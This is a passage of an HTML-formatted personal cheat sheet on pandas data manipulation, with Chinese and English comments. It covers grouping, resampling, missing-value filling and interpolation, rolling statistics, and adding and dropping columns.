class="hljs-string">&#x27;column&#x27;</span>]<br><span class="hljs-comment"># mask</span><br><span class="hljs-comment"># 查看(notnull)</span><br>mask_1 = df.isnull()<br><span class="hljs-comment"># 不等式</span><br>mask_2 = train_df.PassengerId &lt; <span class="hljs-number">7</span><br><span class="hljs-comment"># regex</span><br>mask_3 = Series.<span class="hljs-built_in">str</span>.contains(pat, <span class="hljs-keyword">case</span>=<span class="hljs-literal">True</span>, flags=re.I, na=<span class="hljs-literal">None</span>, regex=<span class="hljs-literal">True</span>)<br><span class="hljs-comment"># 合并</span><br>mask = mask_1 &amp; mask_2 &amp; mask_3<br><span class="hljs-comment"># 取值</span><br>null_df = df[mask].loc[:,[column_list]]<br><span class="hljs-comment"># 根据index</span><br>df.loc[date:]<br></code></pre></td></tr></table></figure><h3 id="extract">extract</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">dataset[<span class="hljs-string">&#x27;Title&#x27;</span>] = dataset.Name.<span class="hljs-built_in">str</span>.extract(<span class="hljs-string">&#x27; ([A-Za-z]+)\.&#x27;</span>, expand=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h3 id="group">group</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># create group</span><br><span class="hljs-comment"># function (index)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">idx</span>):<br>    <span class="hljs-comment"># df global value</span><br>    <span class="hljs-keyword">if</span> df.loc[idx] &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;bar&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;A&#x27;</span><br>grouped = df.groupby(func,axis=<span class="hljs-number">1</span>,dropna=<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># dict name -&gt; group</span><br>grouped.groups<br><span class="hljs-comment"># 命名</span><br>grouped = ts.groupby(<span class="hljs-keyword">lambda</span> x: x.year)<br>grouped.get_group(<span class="hljs-string">&quot;bar&quot;</span>) <br><span class="hljs-comment"># apply calculate</span><br><span class="hljs-comment"># aggregate</span><br>grouped.aggregate([np.<span class="hljs-built_in">sum</span>,np.mean,<span class="hljs-keyword">lambda</span> x : x.<span class="hljs-built_in">sum</span>() - x.mean()])<br><br>grouped.agg(<br>     <span class="hljs-comment"># name = column + function</span><br>     min_height=(<span class="hljs-string">&quot;height&quot;</span>, <span class="hljs-string">&quot;min&quot;</span>),<br>     max_height=(<span class="hljs-string">&quot;height&quot;</span>, <span class="hljs-string">&quot;max&quot;</span>),<br>     average_weight=(<span class="hljs-string">&quot;weight&quot;</span>, np.mean),<br>)<br><span class="hljs-comment"># using a dict on a Series for aggregation is deprecated and will be removed in a future version</span><br><span class="hljs-comment"># 对于series</span><br>grouped.agg(<span class="hljs-built_in">dict</span>&#123;column:func&#125;)<br><span class="hljs-comment"># apply</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mas</span>(<span class="hljs-params">x</span>):<br>    d = &#123;&#125;<br>    d[<span class="hljs-string">&#x27;ma_5&#x27;</span>] = x.iloc[-<span class="hljs-number">5</span>:].mean()<br>    d[<span class="hljs-string">&#x27;ma_10&#x27;</span>] = x.iloc[-<span class="hljs-number">10</span>:].mean()<br>    d[<span class="hljs-string">&#x27;ma_20&#x27;</span>] = x.mean()<br>    <span class="hljs-keyword">return</span> pd.Series(d, index=[<span class="hljs-string">&#x27;ma_5&#x27;</span>, <span class="hljs-string">&#x27;ma_10&#x27;</span>, <span class="hljs-string">&#x27;ma_20&#x27;</span>])<br><br>target = price_df.close.groupby(price_df.index).apply(get_mas)<br><span class="hljs-comment"># multi-index </span><br><span class="hljs-comment"># 根据等级</span><br>s.unstack(level=<span class="hljs-number">1</span>)<br><span class="hljs-comment"># transform</span><br>grouped.transform(func)<br></code></pre></td></tr></table></figure><h3 id="cross_tab">cross_tab</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">pd.crosstab(<br>df[<span class="hljs-string">&#x27;Title&#x27;</span>], df[label]<br>).apply(<br><span class="hljs-keyword">lambda</span> r: r/r.<span class="hljs-built_in">sum</span>(), axis=<span class="hljs-number">1</span><br>)<br></code></pre></td></tr></table></figure><h3 id="count">count</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># count_by_value</span><br><span class="hljs-comment"># frequency</span><br>s.value_counts(normalize=<span class="hljs-literal">True</span>)<br><span class="hljs-comment"># 区间统计 </span><br>s.value_counts(bins=<span class="hljs-number">3</span>)<br><span class="hljs-comment"># 包括nan</span><br>s.value_counts(dropna=<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># count 统计</span><br>df.groupby(<span class="hljs-string">&#x27;a&#x27;</span>).count()<br></code></pre></td></tr></table></figure><h3 id="cut">cut</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># cut by quantity</span><br>df[new_column_name] = pd.qcut(df[num_column[index]],bins)<br><br><span class="hljs-comment"># cut by section</span><br>df[new_column_name] = pd.cut(df[num_column[index]],bins)<br></code></pre></td></tr></table></figure><h3 id="quantile">quantile</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 获取数据的分位点</span><br><span class="hljs-comment"># quartile - quantile - percentile</span><br>df.quantile(ratio_list)<br><br></code></pre></td></tr></table></figure><h2 id="change">change</h2><h3 id="copy">copy</h3><p>df[] 用于查看, 改变值使用df.loc df.loc[:,columns]的改变无法直接inplace 应该使用df.loc[:, columns]接收！！！赋值使用df.values</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># default deep=True</span><br>df.copy()<br><span class="hljs-comment"># 全部由numpy形成的pd则无需深拷贝</span><br><span class="hljs-comment"># loc条件</span><br></code></pre></td></tr></table></figure><h3 id="concat">Concat</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 默认用nan填充</span><br>pd.concat(<span class="hljs-built_in">list</span>, axis)<br><span class="hljs-comment"># 用自定义的值定义</span><br>pd.reindex(df1.index,columns=<span class="hljs-built_in">list</span>,fill_value = <span class="hljs-string">&#x27;None&#x27;</span>)<br><span class="hljs-comment">#只在有交集的部分导入</span><br>pd.concat(<span class="hljs-built_in">list</span>, axis, join=<span class="hljs-string">&quot;inner&quot;</span>)<br><span class="hljs-comment">#shortcat df.join , df.append</span><br>df = df1.join(df2)<br><br><span class="hljs-comment"># merge by index</span><br>new_df = pd.merge(<br>    a,b,<br>    how=<span class="hljs-string">&#x27;inner&#x27;</span>,<br>    <span class="hljs-comment"># on = &#x27;column&#x27;</span><br>    left_index=<span class="hljs-literal">True</span>,<br>    right_index=<span class="hljs-literal">True</span><br>)<br></code></pre></td></tr></table></figure><h3 id="update">update</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Modify in place using non-NA values from another DataFrame.</span><br>df.update(new_df)<br><span class="hljs-comment"># Update null elements with value in the same location in other.</span><br>df1.combine_first(df2)<br></code></pre></td></tr></table></figure><h3 id="resample">resample</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># date_range 设置index</span><br>index = pd.date_range(<span class="hljs-string">&#x27;1/1/2000&#x27;</span>, periods=<span class="hljs-number">9</span>, freq=<span class="hljs-string">&#x27;T&#x27;</span>)<br><span class="hljs-comment"># 转换类型</span><br>pd.to_datetime()<br><br><span class="hljs-comment"># resample 根据freq处理数据</span><br><span class="hljs-comment"># label选择右标题</span><br>series.resample(freq, label=<span class="hljs-string">&#x27;right&#x27;</span>).<span class="hljs-built_in">sum</span>()<br><span class="hljs-comment"># 不包括右标题本身 </span><br>series.resample(<span class="hljs-string">&#x27;3T&#x27;</span>, label=<span class="hljs-string">&#x27;right&#x27;</span>, closed=<span class="hljs-string">&#x27;right&#x27;</span>).<span class="hljs-built_in">sum</span>()<br><br><span class="hljs-comment"># as_freq 重新设置freq留出NAN</span><br>df.asfreq(freq=<span class="hljs-string">&#x27;30S&#x27;</span>, fill_value=<span class="hljs-number">9.0</span>, method=fill_method)<br><br><span class="hljs-comment"># 设置index</span><br>df.resample(<span class="hljs-string">&#x27;M&#x27;</span>, on=<span class="hljs-string">&#x27;week_starting&#x27;</span>).mean()<br><br><span class="hljs-comment"># 标准日期</span><br>pd.offsets.timedelta(days=-<span class="hljs-number">6</span>)<br><span class="hljs-comment"># 调整index</span><br>delta = pd.timedelta(days=-<span class="hljs-number">6</span>)<br>df.index = df.index + delta<br><br><span class="hljs-comment"># 调整数据</span><br>logic = &#123;<span class="hljs-string">&#x27;Open&#x27;</span>  : <span class="hljs-string">&#x27;first&#x27;</span>,<br>         <span class="hljs-string">&#x27;High&#x27;</span>  : <span class="hljs-string">&#x27;max&#x27;</span>,<br>         <span class="hljs-string">&#x27;Low&#x27;</span>   : <span class="hljs-string">&#x27;min&#x27;</span>,<br>         <span class="hljs-string">&#x27;Close&#x27;</span> : <span class="hljs-string">&#x27;last&#x27;</span>,<br>         <span class="hljs-string">&#x27;Volume&#x27;</span>: <span class="hljs-string">&#x27;sum&#x27;</span>&#125;<br><br><span class="hljs-comment"># 调整至周一...</span><br><span class="hljs-built_in">print</span>(df_index.index[<span class="hljs-number">0</span>].weekday())<br>df_sales.resample(<span class="hljs-string">&#x27;2H&#x27;</span>, base=<span class="hljs-number">1</span>).<span class="hljs-built_in">sum</span>()<br><br>new_df = df.resample(<span class="hljs-string">&#x27;W&#x27;</span>,label=<span class="hljs-string">&#x27;left&#x27;</span>).apply(logic)<br>delta = pd.Timedelta(days=<span class="hljs-number">1</span>)<br>new_df.index = new_df.index + delta<br></code></pre></td></tr></table></figure><p><a href=https://pandas.pydata.org/pandas-docs/stable/user_guide/timeseries.html#timeseries-offset-aliases>freqlist</a></p><h3 id="fill">fill</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> scipy.interpolate <span class="hljs-keyword">import</span> interp1d<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> mean_squared_error<br><br>df.interpolate(method=<span class="hljs-string">&#x27;cubicspline&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill_matrix</span>(<span class="hljs-params">df,target_col,origin_df=<span class="hljs-literal">None</span></span>):<br>    fig, axes = plt.subplots(<span class="hljs-number">7</span>, <span class="hljs-number">1</span>, sharex=<span class="hljs-literal">True</span>, figsize=(<span class="hljs-number">10</span>, <span class="hljs-number">12</span>))<br>    plt.rcParams.update(&#123;<span class="hljs-string">&#x27;xtick.bottom&#x27;</span> : <span class="hljs-literal">False</span>&#125;)<br><br>    df.plot(title=<span class="hljs-string">&#x27;Actual&#x27;</span>, ax=axes[<span class="hljs-number">0</span>], label=<span class="hljs-string">&#x27;Actual&#x27;</span>, color=<span class="hljs-string">&#x27;green&#x27;</span>, style=<span class="hljs-string">&quot;.-&quot;</span>)    <br>    axes[<span class="hljs-number">0</span>].legend([<span class="hljs-string">&quot;Missing Data&quot;</span>, <span class="hljs-string">&quot;Available Data&quot;</span>])<br>    <br>    df_ffill = df.ffill()<br>    df_ffill[target_col].plot(title=<span class="hljs-string">&#x27;Forward Fill&#x27;</span>, ax=axes[<span class="hljs-number">1</span>], label=<span class="hljs-string">&#x27;Forward Fill&#x27;</span>, style=<span class="hljs-string">&quot;.-&quot;</span>)<br>    <br>    df_bfill = df.bfill()<br>    df_bfill[target_col].plot(title=<span class="hljs-string">&quot;Backward Fill&quot;</span>, ax=axes[<span class="hljs-number">2</span>], label=<span class="hljs-string">&#x27;Back Fill&#x27;</span>, color=<span class="hljs-string">&#x27;firebrick&#x27;</span>, style=<span class="hljs-string">&quot;.-&quot;</span>)<br>    <br>    df[<span class="hljs-string">&#x27;rownum&#x27;</span>] = np.arange(df.shape[<span class="hljs-number">0</span>])<br>    df_nona = df.dropna(subset = [target_col])<br>    f = interp1d(df_nona[<span class="hljs-string">&#x27;rownum&#x27;</span>], df_nona[target_col])<br>    df[<span class="hljs-string">&#x27;linear_fill&#x27;</span>] = f(df[<span class="hljs-string">&#x27;rownum&#x27;</span>])<br>    df[<span class="hljs-string">&#x27;linear_fill&#x27;</span>].plot(title=<span class="hljs-string">&quot;Linear Fill&quot;</span>, ax=axes[<span class="hljs-number">3</span>], label=<span class="hljs-string">&#x27;Linear Fill&#x27;</span>, color=<span class="hljs-string">&#x27;brown&#x27;</span>, style=<span class="hljs-string">&quot;.-&quot;</span>)<br><br>    f2 = interp1d(df_nona[<span class="hljs-string">&#x27;rownum&#x27;</span>], df_nona[target_col], kind=<span class="hljs-string">&#x27;cubic&#x27;</span>)<br>    df[<span class="hljs-string">&#x27;cubic_fill&#x27;</span>] = f2(df[<span class="hljs-string">&#x27;rownum&#x27;</span>])<br>    df[<span class="hljs-string">&#x27;cubic_fill&#x27;</span>].plot(title=<span class="hljs-string">&quot;Cubic Fill&quot;</span>, ax=axes[<span class="hljs-number">4</span>], label=<span class="hljs-string">&#x27;Cubic Fill&#x27;</span>, color=<span class="hljs-string">&#x27;red&#x27;</span>, style=<span class="hljs-string">&quot;.-&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">knn_mean</span>(<span class="hljs-params">ts, n</span>):<br>        out = np.copy(ts)<br>        <span class="hljs-keyword">for</span> i, val <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ts):<br>            <span class="hljs-keyword">if</span> np.isnan(val):<br>                n_by_2 = np.ceil(n/<span class="hljs-number">2</span>)<br>                lower = np.<span class="hljs-built_in">max</span>([<span class="hljs-number">0</span>, <span class="hljs-built_in">int</span>(i-n_by_2)])<br>                upper = np.<span class="hljs-built_in">min</span>([<span class="hljs-built_in">len</span>(ts)+<span class="hljs-number">1</span>, <span class="hljs-built_in">int</span>(i+n_by_2)])<br>                ts_near = np.concatenate([ts[lower:i], ts[i:upper]])<br>                out[i] = np.nanmean(ts_near)<br>        <span class="hljs-keyword">return</span> out<br>    <br>    df[<span class="hljs-string">&#x27;knn_mean&#x27;</span>] = knn_mean(df[target_col].values, <span class="hljs-number">8</span>)<br>    df[<span class="hljs-string">&#x27;knn_mean&#x27;</span>].plot(title=<span class="hljs-string">&quot;KNN Mean&quot;</span>, ax=axes[<span class="hljs-number">5</span>], label=<span class="hljs-string">&#x27;KNN Mean&#x27;</span>, color=<span class="hljs-string">&#x27;tomato&#x27;</span>, alpha=<span class="hljs-number">0.5</span>, style=<span class="hljs-string">&quot;.-&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">seasonal_mean</span>(<span class="hljs-params">ts, n, lr=<span class="hljs-number">0.7</span></span>):<br>        out = np.copy(ts)<br>        <span class="hljs-keyword">for</span> i, val <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ts):<br>            <span class="hljs-keyword">if</span> np.isnan(val):<br>                ts_seas = ts[i-<span class="hljs-number">1</span>::-n]  <span class="hljs-comment"># previous seasons only</span><br>                <span class="hljs-keyword">if</span> np.isnan(np.nanmean(ts_seas)):<br>                    ts_seas = np.concatenate([ts[i-<span class="hljs-number">1</span>::-n], ts[i::n]])  <span class="hljs-comment"># previous and forward</span><br>                out[i] = np.nanmean(ts_seas) * lr<br>        <span class="hljs-keyword">return</span> out<br><br>    df[<span class="hljs-string">&#x27;seasonal_mean&#x27;</span>] = seasonal_mean(df[target_col], n=<span class="hljs-number">12</span>, lr=<span class="hljs-number">1.25</span>)<br>    df[<span class="hljs-string">&#x27;seasonal_mean&#x27;</span>].plot(title=<span class="hljs-string">&quot;Seasonal Mean&quot;</span>, ax=axes[<span class="hljs-number">6</span>], label=<span class="hljs-string">&#x27;Seasonal Mean&#x27;</span>, color=<span class="hljs-string">&#x27;blue&#x27;</span>, alpha=<span class="hljs-number">0.5</span>, style=<span class="hljs-string">&quot;.-&quot;</span>)<br>    <br>    plt.show()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GM11</span>(<span class="hljs-params">x0</span>): <span class="hljs-comment"># 自定义灰色预测函数</span><br>    <span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>    x1 = x0.cumsum() <span class="hljs-comment">#1-AGO序列</span><br>    z1 = (x1[:<span class="hljs-built_in">len</span>(x1)-<span class="hljs-number">1</span>] + x1[<span class="hljs-number">1</span>:])/<span class="hljs-number">2.0</span> <span class="hljs-comment">#紧邻均值（MEAN）生成序列</span><br>    z1 = z1.reshape((<span class="hljs-built_in">len</span>(z1),<span class="hljs-number">1</span>))<br>    B = np.append(-z1, np.ones_like(z1), axis = <span class="hljs-number">1</span>)<br>    Yn = x0[<span class="hljs-number">1</span>:].reshape((<span class="hljs-built_in">len</span>(x0)-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>    [[a],[b]] = np.dot(np.dot(np.linalg.inv(np.dot(B.T, B)), B.T), Yn) <span class="hljs-comment">#计算参数</span><br>    f = <span class="hljs-keyword">lambda</span> k: (x0[<span class="hljs-number">0</span>]-b/a)*np.exp(-a*(k-<span class="hljs-number">1</span>))-(x0[<span class="hljs-number">0</span>]-b/a)*np.exp(-a*(k-<span class="hljs-number">2</span>)) <span class="hljs-comment">#还原值</span><br>    delta = np.<span class="hljs-built_in">abs</span>(x0 - np.array([f(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(x0)+<span class="hljs-number">1</span>)]))<br>    C = delta.std()/x0.std()<br>    P = <span class="hljs-number">1.0</span>*(np.<span class="hljs-built_in">abs</span>(delta - delta.mean()) &lt; <span class="hljs-number">0.6745</span>*x0.std()).<span class="hljs-built_in">sum</span>()/<span class="hljs-built_in">len</span>(x0)<br>    <span class="hljs-keyword">return</span> f, a, b, x0[<span class="hljs-number">0</span>], C, P <span class="hljs-comment">#返回灰色预测函数、a、b、首项、方差比、小残差概率</span><br>    <br>index = pd.date_range(<span class="hljs-string">&#x27;2020-03-09&#x27;</span>,<span class="hljs-string">&#x27;2021-02-01&#x27;</span>, freq=<span class="hljs-string">&#x27;B&#x27;</span>)<br>t_df = pd.DataFrame(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(index)),index=index,columns=[<span class="hljs-string">&#x27;target&#x27;</span>])<br>t_df = t_df.resample(<span class="hljs-string">&#x27;D&#x27;</span>).asfreq()<br>fill_matrix(t_df,<span class="hljs-string">&#x27;target&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="calculate">calculate</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># !!! 计算之前fil</span><br><span class="hljs-comment"># statistic</span><br>df[<span class="hljs-string">&#x27;Age&#x27;</span>].mean() <br>df[<span class="hljs-string">&#x27;Age&#x27;</span>].var()<br><span class="hljs-comment"># shift</span><br>df.pct_change(periods=)<br>df.diff(periods=)<br><span class="hljs-comment"># cumulative</span><br>df.cumsum(),df.cumprod()<br><br>df[basic[-<span class="hljs-number">1</span>]] = df[basic[-<span class="hljs-number">1</span>]]/<span class="hljs-number">100</span><br><br>final_df[name] = df.close.values/df.<span class="hljs-built_in">open</span>.values - <span class="hljs-number">1</span><br><span class="hljs-comment"># final_df.loc[:,&#x27;&#x27;]</span><br><span class="hljs-comment"># get min of id</span><br>idxmin()<br>df.idxmax(axis = <span class="hljs-number">1</span>, skipna = <span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># ema</span><br>exp = df.ewm(<br>    span=period,<br>    <span class="hljs-comment"># 是否使用递推式</span><br>    adjust=<span class="hljs-literal">False</span><br>).mean()<br><br><span class="hljs-comment"># cma</span><br>df = df.expanding().mean()<br><br><span class="hljs-comment"># sma</span><br>df = df.rolling(<br>    window=period<br>).mean()<br><br><span class="hljs-comment"># subtract series</span><br><span class="hljs-comment"># 默认axis = 1 -&gt; 调整角度 .T</span><br>df.sub(sr, axis = <span class="hljs-number">1</span>)<br><span class="hljs-comment"># 沿着轴线</span><br><br><span class="hljs-comment"># numpy</span><br>numpy.dot<br>np.log(target)<br></code></pre></td></tr></table></figure><h3 id="colindex">col/index</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">df.index = <span class="hljs-built_in">list</span><br>df.columns = <span class="hljs-built_in">list</span><br>df.rename(columns=&#123;<span class="hljs-string">&#x27;c_per&#x27;</span>:<span class="hljs-string">&#x27;result&#x27;</span>&#125;,inplace=<span class="hljs-literal">True</span>)<br>df.T <br><span class="hljs-comment"># new sequential index is used</span><br>df.reset_index(drop=<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># reindex -&gt; 填充逻辑</span><br>mask = mask.reindex(price_df.index.values)<br><br><span class="hljs-comment"># change index</span><br>as_list = df.index.tolist()<br>idx = as_list.index(<span class="hljs-string">&#x27;Republic of Korea&#x27;</span>)<br>as_list[idx] = <span class="hljs-string">&#x27;South Korea&#x27;</span><br>df.index = as_list<br></code></pre></td></tr></table></figure><h3 id="adddrop">add/drop</h3><p><strong>为了保证数据类型的一致 通过 df2.values来添加新列</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># columns</span><br><span class="hljs-comment"># dict map to existing value</span><br><span class="hljs-comment"># mask column</span><br>mask = df.isnull().<span class="hljs-built_in">sum</span>(axis=<span class="hljs-number">0</span>) / <span class="hljs-built_in">len</span>(df) &lt; <span class="hljs-number">0.2</span><br>df = df.T[mask].T<br>mask = df.isnull().<span class="hljs-built_in">sum</span>(axis=<span class="hljs-number">1</span>)/<span class="hljs-built_in">len</span>(df.columns) &lt; <span class="hljs-number">0.2</span><br>df = df[mask]<br><br><span class="hljs-comment"># mask </span><br>df[<span class="hljs-built_in">len</span>(df.columns)] = <span class="hljs-built_in">list</span>/<span class="hljs-built_in">dict</span><br>df.loc[:,column_name] = <span class="hljs-built_in">list</span><br> <br>df.insert(position,column_name,val,<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#rows</span><br><span class="hljs-comment">#若没有该index,默认为在最后插入</span><br>df.loc[index] = <span class="hljs-built_in">list</span><br><br><span class="hljs-comment"># drop</span><br>df.drop([<span class="hljs-string">&#x27;a&#x27;</span>], axis=<span class="hljs-number">1</span>, inplace=<span class="hljs-literal">True</span>)<br><span class="hljs-comment"># 只所有</span><br>df = df.dropna(axis = <span class="hljs-number">0</span>, how = <span class="hljs-string">&#x27;all&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="replace">replace</h3><p>3-dimension</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># a. column_name(默认为空) 